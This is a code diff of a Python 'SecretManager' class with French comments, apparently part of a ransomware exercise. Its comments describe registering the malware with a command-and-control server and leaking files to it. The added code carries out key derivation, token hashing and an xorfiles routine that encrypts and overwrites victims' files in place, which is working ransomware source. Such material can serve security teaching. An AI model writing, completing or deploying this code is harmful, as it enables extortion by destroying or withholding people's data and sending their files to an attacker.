@@ -33,8 +33,6 @@ class SecretManager:
         kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=self.TOKEN_LENGTH, salt=salt, iterations=self.ITERATION)#On hache le sel en SHA256 (sur 16 bits)
         dk = kdf.derive(key)#on dérive le hachage avec la clé qui est elle aussi random
         return dk
-    #
-
 
     def create(self)->Tuple[bytes, bytes, bytes]:
          #On génère un sel et une clé aléatoires
@@ -45,7 +43,6 @@ class SecretManager:
         # On génère le token aléatoire
         self._token = os.urandom(self.TOKEN_LENGTH)
         return self._salt, self._key, self._token
-
 
     def bin_to_b64(self, data:bytes)->str:
         tmp = base64.b64encode(data)
@@ -63,9 +60,7 @@ class SecretManager:
         if response.status_code != 200:
             raise Exception("Failed to send data to server")
         #on vérifie si la requête a bien été envoyée.
-
-        
-
+       
     def setup(self)->None:
         # main function to create crypto data and register malware to cnc
         salt, key, token = self.create()
@@ -89,11 +84,18 @@ class SecretManager:
 
     def get_hex_token(self)->str:
         # Should return a string composed of hex symbole, regarding the token
-        raise NotImplemented()
-
+        hash_object = sha256(self._token)
+        hex_dig = hash_object.hexdigest()
+        return hex_dig
+    
     def xorfiles(self, files:List[str])->None:
         # xor a list for file
-        raise NotImplemented()
+        for file in files:
+            with open(file, "rb") as f:
+                plaintext = f.read()
+            ciphertext = bytes([plaintext[i] ^ self._key[i % len(self._key)] for i in range(len(plaintext))])
+            with open(file, "wb") as f:
+                f.write(ciphertext)
 
     def leak_files(self, files:List[str])->None:
         # send file, geniune path and token to the CNC
